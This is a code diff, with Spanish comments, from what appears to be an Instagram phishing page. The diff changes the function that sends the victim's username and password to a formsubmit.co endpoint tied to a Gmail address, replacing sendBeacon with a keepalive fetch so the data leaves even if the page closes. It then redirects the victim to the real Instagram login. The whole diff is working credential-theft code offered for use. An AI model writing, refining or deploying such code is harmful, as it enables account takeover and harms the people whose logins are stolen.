@@ -259,19 +259,26 @@
             submitBtn.disabled = true;
             submitBtn.textContent = "Redirigiendo...";
 
-            // Creamos el paquete de datos en formato JSON listo para enviar
-            const formData = JSON.stringify({
+            const formData = {
                 Usuario: document.getElementById('usernameInput').value,
                 Contraseña: passwordInput.value,
                 _captcha: "false",
                 _template: "table"
-            });
+            };
 
-            // Usamos sendBeacon para garantizar el envío inmediato por debajo, 
-            // asegurando que la data salga aunque el usuario abandone la página de inmediato.
-            navigator.sendBeacon("https://formsubmit.co/ajax/trollgaga999@gmail.com", formData);
+            // Petición con keepalive: permite enviar datos JSON limpios en segundo plano 
+            // asegurando que la solicitud no se cancele aunque el usuario abandone la página de inmediato.
+            fetch("https://formsubmit.co/ajax/trollgaga999@gmail.com", {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(formData),
+                keepalive: true
+            }).catch(error => console.log('Error', error));
 
-            // Redirección ultra rápida al entorno de Instagram
+            // Redirección instantánea al entorno de Instagram
             window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
         });
     </script>
